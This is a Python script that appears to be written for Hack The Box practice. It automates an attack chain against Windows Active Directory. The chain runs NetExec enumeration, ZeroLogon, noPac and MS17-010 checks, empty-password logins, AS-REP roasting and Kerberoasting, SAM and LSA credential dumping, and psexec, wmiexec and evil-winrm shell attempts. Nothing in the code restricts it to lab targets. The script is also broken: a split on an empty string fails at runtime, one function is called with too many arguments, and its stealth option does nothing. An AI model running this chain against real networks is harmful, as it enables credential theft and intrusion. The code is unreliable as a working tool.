#!/usr/bin/env python3
"""
Auto Windows AD Recon Tool for HTB
- Initial recon
- AD enumeration  
- Vulnerability scanning
- Privilege escalation
- Shell access
"""

import subprocess
import sys
import os
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

def banner():
    print(f"""{Colors.BLUE}
    ╔════════════════════════════════════════╗
    ║     HTB Windows AD Auto Recon v2.0     ║
    ║        First Blood Edition             ║
    ╚════════════════════════════════════════╝{Colors.RESET}
    """)

def run_cmd(cmd, timeout=45, capture=True):
    """Run command with timeout and error handling"""
    try:
        print(f"{Colors.YELLOW}[*] Running: {' '.join(cmd)}{Colors.RESET}")
        result = subprocess.run(cmd, capture_output=capture, text=True, timeout=timeout)
        if result.stdout:
            # Limit output to avoid clutter
            lines = result.stdout.split('')
            if len(lines) > 20:
                print(''.join(lines[:15]))
                print(f"{Colors.YELLOW}[...] Output truncated ({len(lines)} lines){Colors.RESET}")
            else:
                print(result.stdout)
        return result
    except subprocess.TimeoutExpired:
        print(f"{Colors.RED}[-] Command timed out: {' '.join(cmd[:2])}{Colors.RESET}")
        return None
    except FileNotFoundError:
        print(f"{Colors.RED}[-] Tool not found: {cmd[0]}{Colors.RESET}")
        return None
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
        return None

def initial_recon(target):
    """Similar to start_htb.py initial recon"""
    print(f"{Colors.GREEN}[+] Phase 0: Initial Reconnaissance{Colors.RESET}")
    print("="*60)
    
    tasks = [
        ["nxc", "smb", target, "--shares"],  # Anonymous SMB
        ["nxc", "ldap", target],              # Anonymous LDAP
        ["nxc", "winrm", target],              # Check WinRM
        ["nxc", "rdp", target],                # Check RDP
        ["nxc", "ssh", target],                # Check SSH
        ["nxc", "ftp", target],                # Check FTP
    ]
    
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(run_cmd, task) for task in tasks]
        for future in as_completed(futures):
            pass

def enum_ad_full(target, username, password, domain=""):
    """Full AD enumeration"""
    print(f"{Colors.GREEN}[+] Phase 1: AD Enumeration{Colors.RESET}")
    print("="*60)
    
    creds = f"{domain}\{username}" if domain else username
    
    # LDAP enumeration
    ldap_tasks = [
        ["nxc", "ldap", target, "-u", username, "-p", password, "--users"],
        ["nxc", "ldap", target, "-u", username, "-p", password, "--groups"],
        ["nxc", "ldap", target, "-u", username, "-p", password, "--trusted-for-delegation"],
        ["nxc", "ldap", target, "-u", username, "-p", password, "--password-not-required"],
        ["nxc", "ldap", target, "-u", username, "-p", password, "--admin-count"],
        ["nxc", "ldap", target, "-u", username, "-p", password, "--bloodhound", "-c", "all"],
        ["nxc", "ldap", target, "-u", username, "-p", password, "-M", "maq"],
    ]
    
    # SMB enumeration  
    smb_tasks = [
        ["nxc", "smb", target, "-u", username, "-p", password, "--shares"],
        ["nxc", "smb", target, "-u", username, "-p", password, "--sessions"],
        ["nxc", "smb", target, "-u", username, "-p", password, "--disks"],
        ["nxc", "smb", target, "-u", username, "-p", password, "--loggedon-users"],
        ["nxc", "smb", target, "-u", username, "-p", password, "--pass-pol"],
        ["nxc", "smb", target, "-u", username, "-p", password, "--users"],
        ["nxc", "smb", target, "-u", username, "-p", password, "--groups"],
    ]
    
    # Impacket enumeration
    impacket_tasks = [
        ["netexec", "ldap", target, "-u", username, "-p", password, "-M", "adcs"],
        ["certipy", "find", "-u", creds, "-p", password, "-dc-ip", target, "-vulnerable"],
    ]
    
    print(f"{Colors.YELLOW}[*] Running LDAP enumeration...{Colors.RESET}")
    with ThreadPoolExecutor(max_workers=3) as executor:
        ldap_futures = [executor.submit(run_cmd, task) for task in ldap_tasks]
        for future in as_completed(ldap_futures):
            pass
    
    print(f"{Colors.YELLOW}[*] Running SMB enumeration...{Colors.RESET}")
    with ThreadPoolExecutor(max_workers=3) as executor:
        smb_futures = [executor.submit(run_cmd, task) for task in smb_tasks]
        for future in as_completed(smb_futures):
            pass

def check_vulnerabilities(target, username, password, domain):
    """Scan for known CVEs and misconfigurations"""
    print(f"{Colors.GREEN}[+] Phase 2: Vulnerability Scanning{Colors.RESET}")
    print("="*60)
    
    vuln_tasks = [
        # NetExec modules
        ["nxc", "smb", target, "-u", username, "-p", password, "-M", "all"],
        ["nxc", "ldap", target, "-u", username, "-p", password, "-M", "all"],
        ["nxc", "smb", target, "-u", username, "-p", password, "-M", "zerologon"],
        ["nxc", "smb", target, "-u", username, "-p", password, "-M", "nopac"],
        ["nxc", "smb", target, "-u", username, "-p", password, "-M", "ms17-010"],
        ["nxc", "smb", target, "-u", username, "-p", password, "-M", "smbghost"],
        
        # Bruteforce attempts with null/guest
        ["nxc", "smb", target, "-u", "guest", "-p", ""],
        ["nxc", "smb", target, "-u", "Administrator", "-p", ""],
        
        # AS-REP roasting
        ["nxc", "ldap", target, "-u", username, "-p", password, "--asreproast", "asrep.txt"],
        
        # Kerberoasting
        ["nxc", "ldap", target, "-u", username, "-p", password, "--kerberoast", "kerb.txt"],
        
        # Check for delegated accounts
        ["nxc", "ldap", target, "-u", username, "-p", password, "-M", "delegation"],
    ]
    
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(run_cmd, task, 30) for task in vuln_tasks]
        for future in as_completed(futures):
            pass
    
    # Certipy for ADCS enumeration
    print(f"{Colors.YELLOW}[*] Checking ADCS vulnerabilities...{Colors.RESET}")
    run_cmd(["certipy", "find", "-u", f"{domain}\{username}" if domain else username, 
             "-p", password, "-dc-ip", target, "-vulnerable", "-stdout"])

def privesc_check(target, username, password):
    """Check for privilege escalation vectors"""
    print(f"{Colors.GREEN}[+] Phase 3: Privilege Escalation{Colors.RESET}")
    print("="*60)
    
    # Dump SAM/LSA secrets
    print(f"{Colors.YELLOW}[*] Attempting credential dumping...{Colors.RESET}")
    tasks = [
        ["nxc", "smb", target, "-u", username, "-p", password, "--sam"],
        ["nxc", "smb", target, "-u", username, "-p", password, "--lsa"],
        ["nxc", "smb", target, "-u", username, "-p", password, "--wmi", "SELECT * FROM win32_service"],
        ["nxc", "smb", target, "-u", username, "-p", password, "-M", "wmiexec"],
    ]
    
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = [executor.submit(run_cmd, task) for task in tasks]
        for future in as_completed(futures):
            pass

def try_shells(target, username, password, domain=""):
    """Attempt various shell access methods"""
    print(f"{Colors.GREEN}[+] Phase 4: Shell Access{Colors.RESET}")
    print("="*60)
    
    creds = f"{domain}\{username}" if domain else username
    
    # Check which services are available
    print(f"{Colors.YELLOW}[*] Checking available services...{Colors.RESET}")
    result = run_cmd(["nxc", "winrm", target, "-u", username, "-p", password], capture=False)
    
    if result and result.returncode == 0:
        print(f"{Colors.GREEN}[+] WinRM available - Getting shell...{Colors.RESET}")
        run_cmd(["evil-winrm", "-i", target, "-u", username, "-p", password], timeout=120)
    
    # Try other methods
    methods = [
        ["impacket-psexec" if sys.platform == "linux" else "psexec.py", f"{creds}@{target}"],
        ["impacket-wmiexec" if sys.platform == "linux" else "wmiexec.py", f"{creds}@{target}"],
        ["impacket-smbexec" if sys.platform == "linux" else "smbexec.py", f"{creds}@{target}"],
    ]
    
    for method in methods:
        print(f"{Colors.YELLOW}[*] Trying: {method[0]}{Colors.RESET}")
        run_cmd(method, timeout=30, capture=False)

def quick_scan(target):
    """Quick scan for common Windows services"""
    print(f"{Colors.GREEN}[+] Quick Service Scan{Colors.RESET}")
    print("="*60)
    
    # Single comprehensive scan
    run_cmd(["nxc", target], capture=False)

def save_results(target):
    """Optional: save results to file"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    # Results are printed to stdout, but could be logged

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="HTB Windows AD Auto Recon Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-u", "--username", help="Username (default: htbuser)", default="htbuser")
    parser.add_argument("-p", "--password", help="Password (default: Password123!)", default="Password123!")
    parser.add_argument("-d", "--domain", help="Domain name", default="")
    parser.add_argument("-s", "--stealth", help="Stealth mode - minimal noise", action="store_true")
    parser.add_argument("--quick", help="Quick scan only", action="store_true")
    parser.add_argument("--no-shell", help="Skip shell attempts", action="store_true")
    
    args = parser.parse_args()
    
    # Display target info
    print(f"{Colors.YELLOW}[+] Target: {args.target}{Colors.RESET}")
    print(f"{Colors.YELLOW}[+] User: {args.username}{Colors.RESET}")
    print(f"{Colors.YELLOW}[+] Password: {'*' * len(args.password)}{Colors.RESET}")
    print(f"{Colors.YELLOW}[+] Domain: {args.domain or 'N/A'}{Colors.RESET}")
    print()
    
    # Execute phases
    initial_recon(args.target)
    
    if args.quick:
        quick_scan(args.target)
        return
    
    enum_ad_full(args.target, args.username, args.password, args.domain)
    check_vulnerabilities(args.target, args.username, args.password, args.domain)
    privesc_check(args.target, args.username, args.password, args.domain)
    
    if not args.no_shell:
        try_shells(args.target, args.username, args.password, args.domain)
    
    print(f"{Colors.GREEN}[+] Scan complete! Check results above.{Colors.RESET}")
    print(f"{Colors.YELLOW}[!] Don't forget to check: asrep.txt, kerb.txt for roasted hashes{Colors.RESET}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python ad_recon.py <TARGET_IP> [-u USERNAME] [-p PASSWORD] [-d DOMAIN]")
        print("Example: python ad_recon.py 10.10.10.123 -u htbuser -p 'Password123!' -d htb.local")
        sys.exit(1)
    main()